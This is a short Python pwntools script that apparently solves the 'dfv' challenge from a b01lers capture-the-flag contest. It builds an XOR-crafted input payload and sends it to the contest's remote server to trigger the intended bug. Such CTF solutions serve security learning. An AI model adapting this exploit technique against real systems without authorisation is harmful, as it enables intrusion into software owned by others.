#!/usr/bin/env python3

from pwn import *

s = b'ICWIENER'
xor = b'AAAAAAAR'
key = b''.join(p8(i ^ j) for (i, j) in zip(s[:-1], xor[:-1])) + b'\n'
payload = s + xor + key

# p = process('./dfv')
p = remote('pwn.ctf.b01lers.com', 1001)
p.recvline_endswith(b'examine?')
p.send(payload)
p.recvline()
p.stream()
